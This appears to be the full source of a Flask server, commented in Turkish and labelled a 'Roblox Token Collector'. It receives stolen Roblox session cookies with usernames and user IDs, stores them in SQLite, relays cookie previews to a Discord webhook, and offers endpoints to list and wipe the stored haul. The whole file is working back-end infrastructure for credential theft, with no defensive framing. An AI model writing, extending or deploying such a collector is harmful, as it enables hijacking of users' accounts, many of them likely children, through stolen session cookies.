from flask import Flask, request, jsonify
import requests
import os
import time
import sqlite3

app = Flask(__name__)

# Render'daki Environment Variables'tan çekilir
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
AUTH_KEY = os.environ.get("AUTH_KEY", "gizlisifre")

DB_PATH = "/tmp/tokens.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""CREATE TABLE IF NOT EXISTS tokens(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cookie TEXT, username TEXT, user_id TEXT, ts INTEGER)""")
    conn.commit()
    conn.close()

@app.route("/collect", methods=["POST"])
def collect():
    try:
        data = request.json or {}
        if data.get("key") != AUTH_KEY:
            return jsonify({"error": "unauthorized"}), 401
        
        cookie = data.get("cookie", "")
        username = data.get("username", "")
        user_id = data.get("user_id", "")
        
        # Sadece boş olup olmadığını kontrol ediyoruz, uzunluk sınırı yok
        if not cookie or len(cookie) < 5:
            return jsonify({"error": "empty or invalid cookie"}), 400
        
        conn = sqlite3.connect(DB_PATH)
        conn.execute("INSERT INTO tokens(cookie, username, user_id, ts) VALUES(?,?,?,?)",
                     (cookie, username, user_id, int(time.time())))
        conn.commit()
        conn.close()
        
        if DISCORD_WEBHOOK:
            # Discord'a mesaj at (uzun cookie'yi kısaltarak gösteriyoruz)
            embed = {
                "title": "🎯 Yeni Roblox Verisi Alındı!",
                "color": 0x00ff00,
                "fields": [
                    {"name": "Username", "value": username or "?", "inline": True},
                    {"name": "User ID", "value": user_id or "?", "inline": True},
                    {"name": "Toplam Cookie Uzunluğu", "value": str(len(cookie)), "inline": False},
                    {"name": "Cookie Önizleme", "value": f"`{cookie[:100]}...`", "inline": False},
                ],
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            }
            try:
                requests.post(DISCORD_WEBHOOK, json={"embeds": [embed]}, timeout=10)
            except Exception as e:
                print(f"Discord webhook hatası: {e}")
        
        return jsonify({"ok": True, "count": 1})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/tokens", methods=["GET"])
def list_tokens():
    key = request.args.get("key", "")
    if key != AUTH_KEY:
        return jsonify({"error": "unauthorized"}), 401
    
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute("SELECT cookie, username, user_id, ts FROM tokens ORDER BY id DESC").fetchall()
    conn.close()
    
    return jsonify([{"cookie": r[0], "username": r[1], "user_id": r[2], "ts": r[3]} for r in rows])

@app.route("/clear", methods=["POST"])
def clear_tokens():
    data = request.json or {}
    if data.get("key") != AUTH_KEY:
        return jsonify({"error": "unauthorized"}), 401
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("DELETE FROM tokens")
    conn.commit()
    conn.close()
    
    return jsonify({"ok": True})

@app.route("/")
@app.route("/ping")
def home():
    return "Roblox Token Collector is running perfectly!"

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
